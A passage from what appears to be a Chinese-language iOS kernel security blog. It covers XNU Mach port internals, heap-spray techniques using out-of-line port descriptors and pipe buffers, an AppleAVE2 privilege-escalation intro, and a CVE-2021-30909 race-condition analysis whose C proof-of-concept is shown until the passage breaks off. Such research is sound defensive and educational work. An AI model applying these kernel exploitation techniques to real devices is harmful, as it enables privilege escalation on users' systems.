class="keyword">if</span> (copy_option != MACH_MSG_PHYSICAL_COPY &amp;&amp;</span><br><span class="line">        copy_option != MACH_MSG_VIRTUAL_COPY) &#123;</span><br><span class="line">        *mr = MACH_SEND_INVALID_TYPE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* calculate length of data in bytes, rounding up */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (os_mul_overflow(count, <span class="keyword">sizeof</span>(<span class="type">mach_port_t</span>), &amp;ports_length)) &#123;</span><br><span class="line">        *mr = MACH_SEND_TOO_LARGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (os_mul_overflow(count, <span class="keyword">sizeof</span>(<span class="type">mach_port_name_t</span>), &amp;names_length)) &#123;</span><br><span class="line">        *mr = MACH_SEND_TOO_LARGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ports_length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> user_dsc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = kalloc(ports_length); <span class="comment">// 分配内存</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *mr = MACH_SEND_NO_BUFFER;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __LP64__</span></span><br><span class="line">    <span class="type">mach_port_name_t</span> *names = &amp;((<span class="type">mach_port_name_t</span> *)data)[count];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">mach_port_name_t</span> *names = ((<span class="type">mach_port_name_t</span> *)data);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copyinmap(<span class="built_in">map</span>, addr, names, names_length) != KERN_SUCCESS) &#123;</span><br><span class="line">        kfree(data, ports_length);</span><br><span class="line">        *mr = MACH_SEND_INVALID_MEMORY;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (deallocate) &#123;</span><br><span class="line">        (<span class="type">void</span>) mach_vm_deallocate(<span class="built_in">map</span>, addr, (<span class="type">mach_vm_size_t</span>)ports_length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    objects = (<span class="type">ipc_object_t</span> *) data; <span class="comment">// 转ipc_object_t类型</span></span><br><span class="line">    dsc-&gt;address = data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="type">mach_port_name_t</span> name = names[i];</span><br><span class="line">        <span class="type">ipc_object_t</span> object;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!MACH_PORT_VALID(name)) &#123;</span><br><span class="line">            objects[i] = (<span class="type">ipc_object_t</span>)CAST_MACH_NAME_TO_PORT(name);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">kern_return_t</span> kr = ipc_object_copyin(space, name, user_disp, &amp;object);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                object = objects[j];</span><br><span class="line">                <span class="keyword">if</span> (IPC_OBJECT_VALID(object))</span><br><span class="line">                    ipc_object_destroy(object, result_disp);</span><br><span class="line">            &#125;</span><br><span class="line">            kfree(data, ports_length);</span><br><span class="line">            dsc-&gt;address = <span class="literal">NULL</span>;</span><br><span class="line">			<span class="keyword">if</span> ((*optionp &amp; MACH_SEND_KERNEL) == <span class="number">0</span>) &#123;</span><br><span class="line">				mach_port_guard_exception(name, <span class="number">0</span>, <span class="number">0</span>, kGUARD_EXC_SEND_INVALID_RIGHT);</span><br><span class="line">			&#125;</span><br><span class="line">            *mr = MACH_SEND_INVALID_RIGHT;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((dsc-&gt;disposition == MACH_MSG_TYPE_PORT_RECEIVE) &amp;&amp;</span><br><span class="line">                ipc_port_check_circularity(</span><br><span class="line">                    (<span class="type">ipc_port_t</span>) object,</span><br><span class="line">                    (<span class="type">ipc_port_t</span>) dest))</span><br><span class="line">            kmsg-&gt;ikm_header-&gt;msgh_bits |= MACH_MSGH_BITS_CIRCULAR;</span><br><span class="line"></span><br><span class="line">        objects[i] = object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> user_dsc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用<code>kalloc</code>分配内存，然后转换为<code>ipc_object_t</code>类型，这是一个端口指针的数组。因此可以使用<code>OOL</code>端口描述符发送大量<code>Mach</code>消息，可以使用有效指针或<code>0xFFFFFFFFFFFFFFFFFF(MACH_PORT_DEAD)</code>或<code>0x0000000000000000(MACH_PORT_NULL)</code>填充<code>kalloc zone</code>。</p>
<h2 id="管道缓冲区"><a href="#管道缓冲区" class="headerlink" title="管道缓冲区"></a>管道缓冲区</h2><p>管道是xnu中另一个用于IPC的系统调用。它创建一个 分配一对文件描述符并允许单向数据流的管道。数据流经的缓冲区称为管道缓冲区。可以从缓冲区的读取端读取写入缓冲区的写入端的数据，但是不能反过来。基本上你可以在同一地址空间中进行读写。另一个重要的事情是它占用内核虚拟地址空间，因此是在堆中分配内存的有用原语。默认情况管道缓冲区的大小设置为最大16384字节，所有管道缓冲区的大小设置为最大16MB。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Pipe buffer size, keep moderate in value, pipes take kva space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PIPE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SIZE	16384</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_KVAMAX	(1024 * 1024 * 16)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BIG_PIPE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BIG_PIPE_SIZE	(64*1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SMALL_PIPE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALL_PIPE_SIZE	PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>如果数据已被写入管道缓冲区并且管道缓冲区已满，则认为该管道缓冲区已阻塞。要释放该管道缓冲区必须从中读取数据。可以通过分配许多管道缓冲区并将数据写入其中来利用管道缓冲区进行喷射。可以创建的管道总数是16MB除以16384字节，即1024。</p>
<p>管道缓冲区的优势在于，如果能够获得指向其中一个管道缓冲区的指针并读取其值，则基本上可以识别出是这1024个管道缓冲区中的哪个，然后就可以在这个特定的管道缓冲区中重新分配数据。</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>也可以直接去看<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=377026&signed_aid=RWxVCY6jN3pZa8F0_0iOhg==">Exp</a>，里面注释很详细。</p>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1731">Project Zero Issue tracker</a></p>
<p>[iOS 10 - Kernel Heap Revisited](<a target="_blank" rel="noopener" href="https://gsec.hitb.org/materials/sg2016/D2">https://gsec.hitb.org/materials/sg2016/D2</a> - Stefan Esser - iOS 10 Kernel Heap Revisited.pdf)</p>
<p><a target="_blank" rel="noopener" href="https://www.amazon.com/Mac-OS-Internals-Approach-paperback/dp/0134426541">Mac OS X Internals: A Systems Approach</a></p>
<p><a target="_blank" rel="noopener" href="https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535">MacOS and iOS Internals, Volume III: Security &amp; Insecurity</a></p>
<p><a target="_blank" rel="noopener" href="https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core">CanSecWest 2017 - Port(al) to the iOS Core</a></p>
<p><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1731">Project Zero Issue tracker</a></p>
<p>[iOS 10 - Kernel Heap Revisited](<a target="_blank" rel="noopener" href="https://gsec.hitb.org/materials/sg2016/D2">https://gsec.hitb.org/materials/sg2016/D2</a> - Stefan Esser - iOS 10 Kernel Heap Revisited.pdf)</p>
<p><a target="_blank" rel="noopener" href="https://www.amazon.com/Mac-OS-Internals-Approach-paperback/dp/0134426541">Mac OS X Internals: A Systems Approach</a></p>
<p><a target="_blank" rel="noopener" href="https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535">MacOS and iOS Internals, Volume III: Security &amp; Insecurity</a></p>
<p><a target="_blank" rel="noopener" href="https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core">CanSecWest 2017 - Port(al) to the iOS Core</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-02-14T00:53:19.000Z" title="2022/2/14 08:53:19">2022-02-14</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-02-26T04:57:08.347Z" title="2022/2/26 12:57:08">2022-02-26</time></span><span class="level-item">a minute read (About 112 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/02/14/iOS-LPE-AppleAVE2/">iOS-LPE-AppleAVE2</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.zecops.com/research/running-code-in-the-context-of-ios-kernel-part-i-lpe-poc-on-ios-13-7/">https://blog.zecops.com/research/running-code-in-the-context-of-ios-kernel-part-i-lpe-poc-on-ios-13-7/</a></p>
</blockquote>
<p>AppleAVE2 是在内核空间中运行的图形 IOKit 驱动程序，仅存在于 iOS 上，就像许多其他 iOS 专有驱动程序一样，它不是开源的，并且大部分符号已被删除。，而且无法从默认的应用程序沙箱环境访问该驱动程序。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-01-10T13:40:08.000Z" title="2022/1/10 21:40:08">2022-01-10</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-01-21T14:01:19.529Z" title="2022/1/21 22:01:19">2022-01-21</time></span><span class="level-item">10 minutes read (About 1531 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/01/10/iOS-CVE-2021-30909/">CVE-2021-30909</a></p><div class="content"><blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://www.cyberkl.com/cvelist/cvedetail/38">https://www.cyberkl.com/cvelist/cvedetail/38</a></p>
</blockquote>
<h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>这个漏洞是在XNU Mach端口的预分配消息中的，Apple禁止从用户空间中构造预分配消息</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mach_port_allocate_full()</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Don&#x27;t actually honor prealloc requests from user-space</span></span><br><span class="line"><span class="comment"> * (for security reasons, and because it isn&#x27;t guaranteed anyway).</span></span><br><span class="line"><span class="comment"> * Keep old errors for legacy reasons.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (qosp-&gt;prealloc) &#123;</span><br><span class="line">    <span class="keyword">if</span> (qosp-&gt;len &gt; MACH_MSG_SIZE_MAX - MAX_TRAILER_SIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span> KERN_RESOURCE_SHORTAGE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (right != MACH_PORT_RIGHT_RECEIVE) &#123;</span><br><span class="line">        <span class="keyword">return</span> KERN_INVALID_VALUE;</span><br><span class="line">    &#125;</span><br><span class="line">    qosp-&gt;prealloc = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内核不允许用户创建预分配消息端口，但是我们可以直接创建这种类型的端口。mk_timer就是这样的一个内核对象，它可以在用户空间访问，带有预分配消息的Mach端口。另一方面，即使是带着kobject集合的端口也仍然是正常的，因为它的接收者不是ipc_kernel。这就意味着，发往这些端口的消息将被推送到消息队列而不是内核。</p>
<p>导致这个漏洞的根本原因是，当从该端口获取转门（turnstile）对象时，该端口不被锁定。以ipc_port_send_update_inheritor()为例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_port_send_update_inheritor</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_port_t</span> port,</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> turnstile *send_turnstile,</span></span><br><span class="line"><span class="params">	<span class="type">turnstile_update_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">ipc_mqueue_t</span> mqueue = &amp;port-&gt;ip_messages;</span><br><span class="line">	<span class="type">turnstile_inheritor_t</span> inheritor = TURNSTILE_INHERITOR_NULL;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">knote</span> *<span class="title">kn</span>;</span></span><br><span class="line">	<span class="type">turnstile_update_flags_t</span> inheritor_flags = TURNSTILE_INHERITOR_TURNSTILE;</span><br><span class="line"></span><br><span class="line">	imq_held(mqueue);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!ip_active(port)) &#123;</span><br><span class="line">		<span class="comment">/* this port is no longer active, it should not push anywhere */</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (port-&gt;ip_specialreply) &#123;</span><br><span class="line">		<span class="comment">/* Case 1. */</span></span><br><span class="line">		<span class="keyword">if</span> (port-&gt;ip_sync_bootstrap_checkin &amp;&amp; prioritize_launch) &#123;</span><br><span class="line">			inheritor = port-&gt;ip_messages.imq_srp_owner_thread;</span><br><span class="line">			inheritor_flags = TURNSTILE_INHERITOR_THREAD;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (port-&gt;ip_receiver_name == MACH_PORT_NULL &amp;&amp;</span><br><span class="line">	    port-&gt;ip_destination != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="comment">/* Case 2. */</span></span><br><span class="line">		inheritor = port_send_turnstile(port-&gt;ip_destination);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ipc_port_watchport_elem(port) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="comment">/* Case 3. */</span></span><br><span class="line">		<span class="keyword">if</span> (prioritize_launch) &#123;</span><br><span class="line">			assert(port-&gt;ip_sync_link_state == PORT_SYNC_LINK_ANY);</span><br><span class="line">			inheritor = ipc_port_get_watchport_inheritor(port);</span><br><span class="line">			inheritor_flags = TURNSTILE_INHERITOR_THREAD;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (port-&gt;ip_sync_link_state == PORT_SYNC_LINK_WORKLOOP_KNOTE) &#123;</span><br><span class="line">		<span class="comment">/* Case 4. */</span></span><br><span class="line">		inheritor = filt_ipc_kqueue_turnstile(mqueue-&gt;imq_inheritor_knote);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (port-&gt;ip_sync_link_state == PORT_SYNC_LINK_WORKLOOP_STASH) &#123;</span><br><span class="line">		<span class="comment">/* Case 5. */</span></span><br><span class="line">		inheritor = mqueue-&gt;imq_inheritor_turnstile;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (port-&gt;ip_sync_link_state == PORT_SYNC_LINK_RCV_THREAD) &#123;</span><br><span class="line">		<span class="comment">/* Case 6. */</span></span><br><span class="line">		<span class="keyword">if</span> (prioritize_launch) &#123;</span><br><span class="line">			inheritor = port-&gt;ip_messages.imq_inheritor_thread_ref;</span><br><span class="line">			inheritor_flags = TURNSTILE_INHERITOR_THREAD;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((kn = SLIST_FIRST(&amp;mqueue-&gt;imq_klist))) &#123;</span><br><span class="line">		<span class="comment">/* Case 7. Push on a workloop that is interested */</span></span><br><span class="line">		<span class="keyword">if</span> (filt_machport_kqueue_has_turnstile(kn)) &#123;</span><br><span class="line">			assert(port-&gt;ip_sync_link_state == PORT_SYNC_LINK_ANY);</span><br><span class="line">			inheritor = filt_ipc_kqueue_turnstile(kn);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	turnstile_update_inheritor(send_turnstile, inheritor,</span><br><span class="line">	    flags | inheritor_flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在case2 中，如果ip_receiver_name为空，并且ip_destination存在，将会从port-&gt;ip_destination（Mach端口）中获取一个turnstile对象。这样的话，如果当前端口的接收权限被发送给其他端口，XNU把这个接收者叫做ip_destination，内核将会从ip_destination中获取turnstile，而不是当前端口。</p>
<p>首先，目的端口的锁在这个时候没有被持有，这就给了我们一个机会去竞争释放目标端口的turnstile。但如果没有读过这个模块的代码，你会发现这毫无意义。因为当前的端口被绑定到destination，而你不能在当前端口的接收权还在destination的消息队列中时，释放destination的turnstile。</p>
<p>如果深入研究一下port_send_turnstile，我们发现一些有意思的东西：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> port_send_turnstile(port)   (IP_PREALLOC(port) ? (port)-&gt;ip_premsg-&gt;ikm_turnstile : (port)-&gt;ip_send_turnstile)</span></span><br></pre></td></tr></table></figure>

<p>IP_PREALLOC测试端口是否有预分配的消息，并分别获取turnstile。这是因为 ip_premsg和ip_send_turnstile共享同一个union。接下来，我们可以继续研究PREALLOC标志是如何对执行流程进行影响的。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">IP_PREALLOC</span>(port)) &#123;</span><br><span class="line">		<span class="type">ipc_port_t</span> inuse_port;</span><br><span class="line"></span><br><span class="line">		kmsg = port-&gt;ip_premsg;</span><br><span class="line">		<span class="built_in">assert</span>(kmsg != IKM_NULL);</span><br><span class="line">		inuse_port = <span class="built_in">ikm_prealloc_inuse_port</span>(kmsg);</span><br><span class="line">		<span class="built_in">ipc_kmsg_clear_prealloc</span>(kmsg, port);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">imq_lock</span>(&amp;port-&gt;ip_messages);</span><br><span class="line">		<span class="built_in">ipc_port_send_turnstile_recompute_push_locked</span>(port);</span><br><span class="line">		<span class="comment">/* mqueue and port unlocked */</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (inuse_port != IP_NULL) &#123;</span><br><span class="line">			<span class="built_in">assert</span>(inuse_port == port);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">ipc_kmsg_free</span>(kmsg);</span><br><span class="line">		&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>在ipc_port_destroy()中，如果端口被设置为PREALLOC，那么 kmsg将被turnstile本身所取代。我们可以总结出一个竞争流程，如下：</p>
<ol>
<li>线程1执行port_send_turnstile，获取destination，并测试它是否真的是一个预分配的消息端口。</li>
<li>线程2执行ipc_kmsg_clear_prealloc()，并使用turnstile替换kmsg。</li>
<li>线程1从ip_premsg获取了turnstile，实际上是一个turnstile，这将导致一个turnstile在另一个turnstile中。</li>
</ol>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mach/mach.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">mach_port_t</span> <span class="title function_">mk_timer_create</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">kern_return_t</span> <span class="title function_">mk_timer_destroy</span><span class="params">(<span class="type">mach_port_t</span> timer)</span>;</span><br><span class="line"><span class="type">mach_port_t</span> <span class="title function_">thread_get_special_reply_port</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">race_th_args_s</span> <span class="title">race_th_args_t</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">race_th_args_s</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">    <span class="type">mach_port_t</span> move_port;</span><br><span class="line">    <span class="type">mach_port_t</span> sr_port;</span><br><span class="line">    <span class="type">mach_port_t</span> timer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">th_send_link</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">race_th_args_t</span> *rta = (<span class="type">race_th_args_t</span> *)arg;</span><br><span class="line">    <span class="keyword">while</span> (!rta-&gt;start);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">mach_msg_header_t</span> header;</span><br><span class="line">        <span class="type">uint64_t</span> data;</span><br><span class="line">    &#125; link_sr_msg = &#123;</span><br><span class="line">        .header =</span><br><span class="line">            &#123;</span><br><span class="line">                .msgh_remote_port = rta-&gt;move_port,</span><br><span class="line">                .msgh_local_port = rta-&gt;sr_port,</span><br><span class="line">                .msgh_bits =</span><br><span class="line">                    MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, <span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">                .msgh_voucher_port = MACH_PORT_NULL,</span><br><span class="line">                .msgh_id = <span class="number">0x99999999</span>,</span><br><span class="line">                .msgh_size = <span class="keyword">sizeof</span>(link_sr_msg),</span><br><span class="line">            &#125;,</span><br><span class="line">        .data = <span class="number">0x6666666666666666</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">kern_return_t</span> __unused kr 